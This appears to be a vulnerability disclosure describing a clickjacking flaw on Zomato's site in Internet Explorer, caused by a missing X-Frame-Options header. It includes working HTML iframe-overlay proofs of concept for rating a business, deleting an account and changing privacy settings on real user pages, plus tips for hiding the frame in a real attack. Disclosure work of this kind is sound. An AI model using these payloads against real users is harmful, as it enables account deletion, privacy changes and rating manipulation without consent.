Description
-----------

The application does not send a X-Frame-Options header, thus allowing pages to be included in iFrames.

There are some specific actions which can be performed with clicks:

- DOS: Deleting an account (requires 3 clicks)
- Confidentiality/Integrity: Change privacy & notification settings (disabling of "Hide my profile from search engines" / "Prevent my profile from showing up in search results" as well as enabling/disabling of newsletters)
- Integrity: Following/Unfollowing users (requires 1 click), Rating a business (requires 2 clicks), Changing the language of the site, etc. Among other, a business could use this to influence its own rating.

Note that attacks will only work in Internet Explorer.  The CSP directive `frame-ancestors` will prevent inclusion of the page in frames in Firefox and Chrome.

Proof of Concept
----------------

Rate a business:

    <div style="position: absolute; left: 430px; top: 490px; pointer-events: none;">Click 1</div>
    <div style="position: absolute; left: 650px; top: 535px; pointer-events: none;">Click 2</div>
    <iframe style="opacity: 0.2;" height="1000" width="1000" scrolling="no" src="https://www.zomato.com/szczecin/bajgle-kr%C3%B3la-jana-%C5%9Br%C3%B3dmie%C5%9Bcie"></iframe>

The following proof of concepts are specific to one user (in this example with the ID 53373042). A general POC which can be reused across users would require two more clicks (opening the menu drop-down + click on settings).

Delete an Account:

    <div style="position: absolute; left: 70px; top: 860px; pointer-events: none;">Click 1</div>
    <div style="position: absolute; left: 330px; top: 600px; pointer-events: none;">Click 2 & 3</div>
    <iframe style="opacity: 0.2;" height="1000" width="1000" scrolling="no" src="https://www.zomato.com/users/simone-eisenberg-53373042/edit"></iframe>

Change privacy settings: 

	<div style="position: absolute; left: 70px; top: 825px; pointer-events: none;">Click 1</div>
	<div style="position: absolute; left: 295px; top: 900px; pointer-events: none;">Click 2</div>
	<iframe style="opacity: 0.2;" height="1000" width="1000" scrolling="no" src="https://www.zomato.com/users/simone-eisenberg-53453315/edit"></iframe>

Tested with IE11. Note that the script needs to be called on a real domain - not from a local file - as IE will otherwise not send the required cookies.

In a real attack, the zomato page would not be displayed. Javascript could also be used to automatically follow the users mouse pointer, so that a user would only need to click x times anywhere on a page instead of needing to click the specific labels.
